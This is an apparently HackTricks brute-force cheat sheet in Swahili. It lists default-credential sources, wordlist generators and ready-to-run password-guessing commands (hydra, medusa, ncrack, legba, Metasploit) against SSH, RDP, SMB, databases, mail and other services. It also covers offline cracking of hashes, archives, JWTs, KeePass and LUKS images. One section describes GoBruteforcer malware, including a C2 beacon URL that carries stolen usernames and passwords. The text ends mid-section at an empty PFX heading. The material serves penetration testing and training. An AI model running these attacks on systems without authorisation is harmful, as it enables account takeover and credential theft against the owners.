# Brute Force - CheatSheet

{{#include ../banners/hacktricks-training.md}}

## Credentials Chaguomsingi

**Tafuta kwenye Google** credentials chaguomsingi za teknolojia inayotumika, au **jaribu viungo hivi**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Unda Kamusi zako mwenyewe**

Tafuta taarifa nyingi uwezavyo kuhusu lengo na utengeneze kamusi maalum. Zana zinazoweza kusaidia:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Orodha za maneno zinazotegemea tovuti

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Tengeneza nywila kulingana na unachojua kuhusu mwathiriwa (majina, tarehe...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Zana ya kutengeneza wordlist inayokuruhusu kutoa seti ya maneno na kuunda miundo mbalimbali kutokana nayo, ili kutengeneza wordlist ya kipekee na inayofaa kutumika dhidi ya lengwa mahususi.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Wordlists

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Mtiririko wa kazi wa bruteforcer wa mtandao mzima (mafunzo kutoka kwa scanners za Go)

Tabia zifuatazo zilionekana katika mtiririko wa kazi wa kuchanganua wa malware ya GoBruteforcer; thamani halisi hutegemea sampuli.<sup>[[1]](#references)</sup>

- Dumisha **makundi ya worker yaliyotunzwa kulingana na architecture** (kwa mfano, workers 95 wanaofanya kazi sambamba kwenye `x86_64/arm64`, 85 kwenye `i686`, 35 kwenye `armv5tel`, na 50 kwa chaguomsingi kwenye architectures nyingine), kagua workers walio hai kila sekunde, na uanzishe wengine badala yao idadi inapokuwa chini ya lengo; kila worker hushughulikia IP lengwa moja tu kabla ya kutoka.
- Tengeneza **IPv4 za umma za nasibu**, lakini ondoa safu zilizo wazi kuwa haziwezi kuelekezwa na zile ambazo operator amechagua kuepuka: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, `/8` zinazotumiwa sana na cloud (`3/15/16/56`) na `/8` zinazohusishwa na DoD (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Chunguza port ya service** kwa timeout fupi (~2s) kabla ya kujaribu **kuingia kwa maandishi wazi** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin kupitia HTTP/80), na utumie orodha ndogo ya credentials iliyojengewa ndani ikiwa upakuaji wa credentials kutoka C2 hautafaulu.
- **Hamisha data za mafanikio nje** kupitia HTTP GET beacons ndogo kama `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (misimbo ya service kama `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), huku ukitumia tena User-Agent ya kawaida ya browser ili kuficha shughuli.
- **phpMyAdmin spray** inaweza kufanya brute-force kwenye takriban paths 80 zinazowezekana kwa kutumia `GET /index.php?lang=en`, kutambua viashiria vya PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) na kuchanganua `codemirror.css?v=X.Y.Z` ili kuchagua njia ya uthibitishaji: matoleo `<4.9` hukubali vigezo vya GET `pma_username`/`pma_password`; matoleo `>=4.9` hutumia POST yenye `server=1`, CSRF `token`, na credentials zilezile.

## Huduma

Zimepangwa kwa alfabeti kulingana na jina la service.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Brute ya Jumla

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Fomu ya POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Ili kutumia **oracle_login** na **patator**, unahitaji **kusakinisha**:

```bash
pip3 install cx_Oracle --upgrade
```

[Bruteforce ya hash ya OracleSQL nje ya mtandao](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** na **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Unaweza kupakua kifurushi cha `.deb` ili kukisakinisha kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Kwa tabia ya huduma ya Rexec inayotumia nenosiri kuthibitisha, tazama [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Kwa uthibitishaji wa trusted-host na ufikiaji wa terminal, tazama [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Kwa uthibitishaji wa mwenyeji anayeaminika na amri za mbali, tazama [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### SSH keys dhaifu / PRNG inayotabirika ya Debian

Baadhi ya mifumo ina dosari zinazojulikana katika random seed inayotumiwa kuzalisha nyenzo za kriptografia. Hii inaweza kusababisha keyspace kupungua sana, na hivyo kuvunjwa kwa kutumia brute force kwa zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Seti za keys dhaifu zilizozalishwa mapema pia zinapatikana, kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)

Itifaki ya maandishi ya STOMP ni itifaki ya kutuma ujumbe inayotumika sana, **inayowezesha mawasiliano na mwingiliano usio na mshono na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia sanifu na bora ya kubadilishana ujumbe na kutekeleza shughuli mbalimbali za utumaji ujumbe.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Local

### Databases za online cracking

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes and file hashes)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Angalia hili kabla ya kujaribu kutumia brute force kwenye Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Unahitaji kujua **plaintext** (au sehemu ya plaintext) **ya faili iliyo ndani** ya zip iliyosimbwa kwa njia fiche. Unaweza kuangalia **majina na ukubwa wa faili zilizo ndani** ya zip iliyosimbwa kwa njia fiche kwa kutumia: **`7z l encrypted.zip`**\
Pakua [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)kutoka kwenye ukurasa wa matoleo.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Nenosiri la Mmiliki wa PDF

Ili kuvunja nenosiri la Mmiliki wa PDF, angalia hapa: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Picha ya Lucks

#### Mbinu ya 1

Sakinisha: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Mbinu ya 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Mafunzo mengine ya Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Ufunguo wa faragha wa PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Tumia [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) kisha john

### Safu ya Open Office Iliyolindwa kwa Nenosiri

Ikiwa una faili ya xlsx yenye safu iliyolindwa kwa nenosiri, unaweza kuondoa ulinzi wake:

- **Pakia kwenye google drive** na nenosiri litaondolewa kiotomatiki
- Ili **kuiondoa** **kwa mikono**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Vyeti vya PFX

```bash
